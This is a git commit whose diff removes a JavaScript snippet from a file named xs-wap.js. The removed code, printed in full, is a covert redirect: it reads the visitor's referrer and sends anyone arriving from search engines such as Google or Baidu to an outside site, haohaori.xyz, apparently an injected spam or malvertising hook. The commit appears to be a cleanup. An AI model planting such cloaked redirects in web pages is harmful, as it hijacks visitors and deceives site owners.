5eeaed954861851ec6fe16ac9917c6bfe1e8b9ae
allgg <49602399+allgg@users.noreply.github.com>
2019-07-21 20:50:54 +0800

    Update xs-wap.js

--- xs-wap.js
+++ xs-wap.js
@@ -1,18 +1,1 @@
 
-if(window.name != 'ad_app6'){ 
-  var r = document.referrer; 
-  r = r.toLowerCase(); 
-  var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.'); 
-  var b = false; 
-  for (i in aSites){ 
-    if (r.indexOf(aSites[i]) > 0){ 
-      b = true; 
-      break; 
-    } 
-  } 
-  if(b) 
-  { 
-    self.location = 'http://haohaori.xyz'; 
-    window.adworkergo = 'ad_app6'; 
-  } 
-}
